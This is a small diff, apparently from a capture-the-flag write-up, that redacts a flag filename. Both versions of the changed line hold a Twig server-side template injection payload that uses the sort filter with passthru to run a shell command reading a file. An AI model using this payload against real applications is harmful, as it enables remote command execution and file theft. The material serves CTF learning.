@@ -165,7 +165,7 @@ Reading the flag:
 
 {% raw %}
 ```
-{{['cat(flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru'))}}
+{{['cat(flags/<REDACTED>.txt',""]|sort('passthru'))}}
 ```
 {% endraw %}
 
